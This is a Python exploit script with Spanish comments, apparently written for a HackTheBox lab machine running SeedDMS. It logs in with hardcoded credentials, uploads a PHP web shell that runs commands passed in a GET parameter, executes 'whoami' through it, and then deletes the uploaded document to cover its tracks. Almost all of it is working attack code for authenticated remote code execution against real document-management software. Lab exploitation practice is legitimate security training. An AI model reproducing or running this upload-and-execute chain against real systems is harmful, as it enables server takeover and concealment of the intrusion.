#!/usr/bin/python3

import requests
import signal, re
from bs4 import BeautifulSoup

def def_handler(sig, frame):
    print("\nv3moSs\n")
    exit(1)

signal.signal(signal.SIGINT, def_handler)

# Funciones del programa

def extract_id_file(session):
    # - https://www.pluralsight.com/guides/extracting-data-html-beautifulsoup
    r = session.get(url + '/seeddms/out/out.MyDocuments.php')
    r_html = BeautifulSoup(r.text, "html.parser")

    for html_a in r_html.find_all("a"):
        if "1.php" in html_a:
            file_id = html_a.get("href").split('=')[1]

    return file_id

# Variables

url = "http://dms-pit.htb/seeddms51x"
session = requests.Session()

# Login

data_post = {
    "referuri" : "/seeddms51x/seeddms/",
    "login" : "michelle",
    "pwd" : "michelle",
    "lang" : ""
}
r = session.post(url + '/seeddms/op/op.Login.php', data=data_post)

if "Folder 'DMS'" not in r.text:
    print("Error al iniciar sesión")
    exit(1)

# Subimos archivo
# |_ Extraemos token

r = session.get(url + '/seeddms/out/out.AddDocument.php', params={"folderid":"8","showtree":"1"})
token_form = re.findall(r'<input type="hidden" name="formtoken" value="(.*?)"', r.text)[0]

# |_ Ahora si, subimos archivo :P

data_file = [
    ("userfile[]",
        ("1.php", "<?php system($_GET['xmd']); ?>", "application/x-php"))]
data_post = {
    "formtoken" : token_form,
    "folderid" : "8",
    "showtree" : "1",
    "name" : "1.php",
    "comment" : "",
    "keywords" : "",
    "sequence" : "4",
    "presetexpdate" : "never",
    "expdate" : "",
    "reqversion" : "1",
    "version_comment" : ""
}
r = session.post(url + '/seeddms/op/op.AddDocument.php', data=data_post, files=data_file)

# Obtenemos una fake-shell
# |_ Extraemos ID del archivo creado

file_id = extract_id_file(session)

complement_url = "/data/1048576/%s/1.php" % (file_id)
command="whoami"
r = session.get(url + complement_url, params={"xmd":command})
print(r.text)




# Borramos archivo
# |_ Extraemos ID del documento

extract_id_file(session)

# |_ Hacemos el borrado
# |__ Extraemos un nuevo token
# |__ - https://stackoverflow.com/questions/35917164/how-to-extract-name-value-pairs-with-beautifulsoup

r = session.get(url + '/seeddms/out/out.RemoveDocument.php', params={"documentid":file_id})
r_html = BeautifulSoup(r.text, "html.parser")

for html_input in r_html.find_all("input"):
    if "formtoken" in str(html_input):
        token_form = html_input.get("value")

r = session.post(url + '/seeddms/op/op.RemoveDocument.php', data={"documentid":file_id,"formtoken":token_form})
